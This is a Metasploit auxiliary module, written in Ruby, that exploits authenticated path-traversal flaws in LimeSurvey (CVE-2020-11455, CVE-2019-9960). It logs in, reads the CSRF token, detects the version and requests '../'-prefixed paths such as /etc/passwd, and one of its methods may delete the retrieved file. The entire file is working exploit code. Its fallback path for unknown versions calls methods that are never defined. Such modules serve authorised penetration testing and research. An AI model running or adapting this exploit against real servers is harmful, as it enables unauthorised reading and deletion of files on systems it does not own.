##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LimeSurvey Zip Path Traversals',
        'Description' => %q{
          This module exploits an authenticated path traversal vulnerability found in LimeSurvey
          versions between 4.0 and 4.1.11 with CVE-2020-11455 or <= 3.15.9 with CVE-2019-9960,
          inclusive.
          In CVE-2020-11455 the getZipFile function within the filemanager functionality
          allows for arbitrary file download.  The file retrieved may be deleted after viewing,
          which was confirmed in testing.
          In CVE-2019-9960 the szip function within the downloadZip functionality allows
          for arbitrary file download.
          Verified against 4.1.11-200316, 3.15.0-181008, 3.9.0-180604, 3.6.0-180328,
          3.0.0-171222, and 2.70.0-170921.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Matthew Aberegg', # edb/discovery cve 2020
          'Michael Burkey', # edb/discovery cve 2020
          'Federico Fernandez', # cve 2019
          'Alejandro Parodi' # credited in cve 2019 writeup
        ],
        'References' => [
          # CVE-2020-11455
          ['EDB', '48297'], # CVE-2020-11455
          ['CVE', '2020-11455'],
          ['URL', 'https://github.com/LimeSurvey/LimeSurvey/commit/daf50ebb16574badfb7ae0b8526ddc5871378f1b'],
          # CVE-2019-9960
          ['CVE', '2019-9960'],
          ['URL', 'https://www.secsignal.org/en/news/cve-2019-9960-arbitrary-file-download-in-limesurvey/'],
          ['URL', 'https://github.com/LimeSurvey/LimeSurvey/commit/1ed10d3c423187712b8f6a8cb2bc9d5cc3b2deb8']
        ],
        'DisclosureDate' => '2020-04-02'
      )
    )

    register_options(
      [
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ]),
        OptString.new('TARGETURI', [true, 'The base path to the LimeSurvey installation', '/']),
        OptString.new('FILE', [true, 'The file to retrieve', '/etc/passwd']),
        OptString.new('USERNAME', [true, 'LimeSurvey Username', 'admin']),
        OptString.new('PASSWORD', [true, 'LimeSurvey Password', 'password'])
      ]
    )
  end

  def uri
    target_uri.path
  end

  def cve_2020_11455(cookie, ip)
    vprint_status('Attempting to retrieve file')
    print_error 'This method will possibly delete the file retrieved!!!'
    traversal = '../' * datastore['DEPTH']
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, 'index.php', 'admin', 'filemanager', 'sa', 'getZipFile'),
      'cookie' => cookie,
      'vars_get' => {
        'path' => "#{traversal}#{datastore['FILE']}"
      }
    })
    if res && res.code == 200 && !res.body.empty?
      loot = store_loot('', 'text/plain', ip, res.body, datastore['FILE'], 'LimeSurvey Path Traversal')
      print_good("File stored to: #{loot}")
    else
      print_bad('File not found or server not vulnerable')
    end
  end

  def cve_2019_9960_version_3(cookie, ip)
    vprint_status('Attempting to retrieve file')
    traversal = '../' * datastore['DEPTH']
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, 'index.php', 'admin', 'export', 'sa', 'downloadZip'),
      'cookie' => cookie,
      'vars_get' => {
        'sZip' => "#{traversal}#{datastore['FILE']}"
      }
    })
    if res && res.code == 200 && !res.body.empty?
      loot = store_loot('', 'text/plain', ip, res.body, datastore['FILE'], 'LimeSurvey Path Traversal')
      print_good("File stored to: #{loot}")
    else
      print_bad('File not found or server not vulnerable')
    end
  end

  # untested because I couldn't find when this applies.  It is pre 2.7 definitely, but unsure when.
  # this URL scheme was noted in the secsignal write-up
  def cve_2019_9960_pre25(cookie, ip)
    vprint_status('Attempting to retrieve file')
    traversal = '../' * datastore['DEPTH']
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, 'index.php'),
      'cookie' => cookie,
      'vars_get' => {
        'sZip' => "#{traversal}#{datastore['FILE']}",
        'r' => 'admin/export/sa/downloadZip'
      }
    })
    if res && res.code == 200 && !res.body.empty?
      loot = store_loot('', 'text/plain', ip, res.body, datastore['FILE'], 'LimeSurvey Path Traversal')
      print_good("File stored to: #{loot}")
    else
      print_bad('File not found or server not vulnerable')
    end
  end

  def login
    # get csrf
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, 'index.php', 'admin', 'authentication', 'sa', 'login')
    })
    cookie = res.get_cookies
    fail_with(Failure::NoAccess, 'No response from server') unless res

    # this regex is version 4+ compliant, will fail on earlier versions which aren't vulnerable anyways.
    /"csrfTokenName":"(?<csrf_name>\w+)"/i =~ res.body
    /"csrfToken":"(?<csrf_value>[\w=-]+)"/i =~ res.body
    csrf_name = 'YII_CSRF_TOKEN' if csrf_name.blank? # default value
    fail_with(Failure::NoAccess, 'Unable to get CSRF values, check URI and server parameters.') if csrf_value.blank?
    vprint_status("CSRF: #{csrf_name} => #{csrf_value}")

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, 'index.php', 'admin', 'authentication', 'sa', 'login'),
      'cookie' => cookie,
      'vars_post' => {
        csrf_name => csrf_value,
        'authMethod' => 'Authdb',
        'user' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
        'loginlang' => 'default',
        'action' => 'login',
        'width' => '100',
        'login_submit' => 'login'
      }
    })

    if res && res.code == 302 && res.headers['Location'].include?('login') # good login goes to location admin/index not admin/authentication/sa/login
      fail_with(Failure::NoAccess, 'No response from server')
    end
    vprint_good('Login Successful')
    res.get_cookies
  end

  def determine_version(cookie)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, 'index.php', 'admin', 'index'),
      'cookie' => cookie
    })
    fail_with(Failure::NoAccess, 'No response from server') unless res
    /Version\s+(?<version>\d\.\d{1,2}\.\d{1,2})/ =~ res.body
    return nil unless version

    Rex::Version.new(version)
  end

  def run_host(ip)
    cookie = login
    version = determine_version cookie
    if version.nil?
      # try them all!!!
      print_status('Unable to determine version, trying all exploits')
      cve_2020_11455 cookie, ip
      cve_2019_9960_3_15_9 cookie, ip
      cve_2019_9960_pre3_15_9 cookie, ip
    end
    vprint_status "Version Detected: #{version.version}"
    if version.between?(Rex::Version.new('4.0'), Rex::Version.new('4.1.11'))
      cve_2020_11455 cookie, ip
    elsif version.between?(Rex::Version.new('2.50.0'), Rex::Version.new('3.15.9'))
      cve_2019_9960_version_3 cookie, ip
    # 2.50 is when LimeSurvey started doing almost daily releases.  This version was
    # picked arbitrarily as I can't seem to find a lower bounds on when this other
    # method may be needed.
    elsif version < Rex::Version.new('2.50.0')
      cve_2019_9960_pre25 cookie, ip
    else
      print_bad "No exploit for version #{version.version}"
    end
  end
end
